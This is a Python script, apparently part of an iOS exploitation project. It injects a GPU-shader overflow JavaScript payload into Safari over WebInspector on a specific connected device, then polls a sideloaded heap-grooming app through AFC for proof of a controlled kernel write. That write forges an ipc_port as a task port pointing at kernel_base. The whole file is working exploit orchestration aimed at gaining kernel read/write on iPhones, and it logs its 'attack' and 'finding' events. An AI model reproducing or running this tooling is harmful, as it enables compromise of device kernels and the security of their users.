"""
S159 Fire v4: HeapFengShui_v4 + AGX controlled shader
======================================================
Fires s159_agx_rw.js (updated: v[0]=uvec4(IKOT_TASK, 100refs, 0, 0))
into Safari via WebInspector, then polls AFC for HeapFengShui_v4 results.

Expected outcome:
  fengshui_v4_result contains CONTROLLED_WRITE_DETECTED with:
    new_kotype=2 (IKOT_TASK)
    new_kobject=0xfffffe004d928000 (kernel_base written by shader)
  → F-74: Controlled Kernel Write PROVEN
"""
import asyncio, sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
os.environ["PYTHONIOENCODING"] = "utf-8"

from pathlib import Path
from tools.nexus_rag import emit_event

UDID    = "00008150-0019381E1A23401C"
JS_PATH = Path(__file__).parent / "s159_agx_rw.js"

POLL_PATHS = [
    "/var/mobile/Media/DCIM/fengshui_v4_result",
    "/var/mobile/Media/DCIM/fengshui_v4_status",
    "/var/mobile/Media/DCIM/fengshui_v3_result",   # v3 may still be on-device
]


async def inject_js():
    """Inject AGX overflow JS into Safari via WebInspector."""
    from pymobiledevice3.lockdown import create_using_usbmux
    from pymobiledevice3.services.webinspector import WebinspectorService

    print("[*] Connecting WebInspector...")
    lk = await create_using_usbmux(serial=UDID)
    wi = WebinspectorService(lk)
    try:
        await wi.connect(timeout=10)
        await asyncio.sleep(1)

        pages = await wi.get_open_application_pages(timeout=8)
        if not pages:
            print("[!] No open Safari pages — open Safari and navigate to any page first")
            return False

        safari_pages = [ap for ap in pages
                        if 'safari' in ap.application.bundle.lower()]
        target = safari_pages[0] if safari_pages else pages[0]
        print(f"[*] Target page: {target.application.bundle} / {target.page.web_url}")

        session = await wi.inspector_session(target.application, target.page)
        await session.runtime_enable()

        js_code = JS_PATH.read_text(encoding='utf-8')
        print(f"[*] Injecting {len(js_code)} chars (v[0]=IKOT_TASK|0x80000002)...")

        try:
            result = await asyncio.wait_for(
                session.runtime_evaluate(js_code, return_by_value=False),
                timeout=30.0
            )
            print(f"[+] JS injected — result: {str(result)[:150]}")
            emit_event('action', 'agx_js_injected_v4', {
                'page': str(target.page.web_url),
                'shader': 'v[0]=IKOT_TASK+kernel_base_kobject',
                'result': str(result)[:150],
            })
            return True
        except asyncio.TimeoutError:
            print("[!] JS timeout — IIFE running async in Safari")
            return True
    finally:
        await wi.close()


async def poll_afc(poll_seconds=90):
    """Poll AFC for fengshui_v4 result file (90s = 10 rounds × 500ms + margin)."""
    from pymobiledevice3.lockdown import create_using_usbmux
    from pymobiledevice3.services.afc import AfcService

    print(f"\n[*] Polling AFC for v4 results ({poll_seconds}s)...")
    for elapsed in range(poll_seconds):
        await asyncio.sleep(1)
        try:
            lk = await create_using_usbmux(serial=UDID)
            async with AfcService(lk) as afc:
                for path in POLL_PATHS:
                    try:
                        data = await afc.get_file_contents(path)
                        txt = data.decode(errors='replace').strip()
                        if txt and 'READY' not in txt:
                            print(f"\n[+] {path}:\n{txt}")
                            if 'CONTROLLED_WRITE_DETECTED' in txt or 'KERNEL_RW_PROVEN' in txt:
                                print("\n[!!!] CONTROLLED KERNEL WRITE CONFIRMED — F-74!")
                                emit_event('finding', 'F74_controlled_write', {
                                    'result': txt[:500],
                                    'shader': 'v[0]=IKOT_TASK+kernel_base',
                                    'leverages': ['F-72', 'F-73', 'F-68'],
                                })
                                return txt
                    except Exception:
                        pass
        except Exception as e:
            if elapsed % 10 == 0:
                print(f"  [{elapsed}s] AFC poll: {e}")

        if elapsed % 15 == 0 and elapsed > 0:
            print(f"  [{elapsed}s] Waiting for HeapFengShui_v4 to detect corruption...")

    print(f"[-] No v4 result after {poll_seconds}s")
    return None


async def main():
    emit_event('attack', 'agx_controlled_write_v4', {
        'goal': 'F-74: io_bits=IKOT_TASK + ip_kobject=kernel_base in ipc_port',
        'shader': 's159_agx_rw.js v2 (v[0]=IKOT_TASK)',
        'detector': 'HeapFengShui_v4 (survive + kobject readback)',
    })

    print("=" * 60)
    print("S159 AGX CONTROLLED WRITE — v4 FIRE SEQUENCE")
    print("=" * 60)
    print()
    print("PRE-FLIGHT: HeapFengShui_v4 must be installed and running")
    print("  DCIM/fengshui_v4_status should show: READY ports=5000")
    print()

    # Check v4 status first
    try:
        from pymobiledevice3.lockdown import create_using_usbmux
        from pymobiledevice3.services.afc import AfcService
        lk = await create_using_usbmux(serial=UDID)
        async with AfcService(lk) as afc:
            try:
                status = await afc.get_file_contents(
                    "/var/mobile/Media/DCIM/fengshui_v4_status")
                print(f"[v4 status] {status.decode(errors='replace').strip()}")
            except Exception:
                print("[!] fengshui_v4_status NOT FOUND — is HeapFengShui_v4 running?")
                print("[!] Install HeapFengShui_v4_unsigned.ipa via Sideloadly first")
                print("[!] Then launch the app, wait 2s, then re-run this script")
    except Exception as e:
        print(f"[!] Device check failed: {e}")

    # Fire JS
    ok = await inject_js()
    if not ok:
        return

    # Wait for shader to complete (10 rounds × 500ms + 2s startup = ~12s)
    print("\n[*] Waiting 15s for AGX overflow rounds to complete...")
    await asyncio.sleep(15)

    # Poll for results
    result = await poll_afc(poll_seconds=90)

    if result:
        print("\n" + "=" * 60)
        print("F-74 CONTROLLED KERNEL WRITE — MISSION COMPLETE")
        print("=" * 60)
    else:
        print("\n[-] No result. Check:")
        print("    1. HeapFengShui_v4 running? (DCIM/fengshui_v4_status)")
        print("    2. Safari had a WebGL2 page open?")
        print("    3. Run /nexus-triage to check crash logs")


if __name__ == "__main__":
    asyncio.run(main())
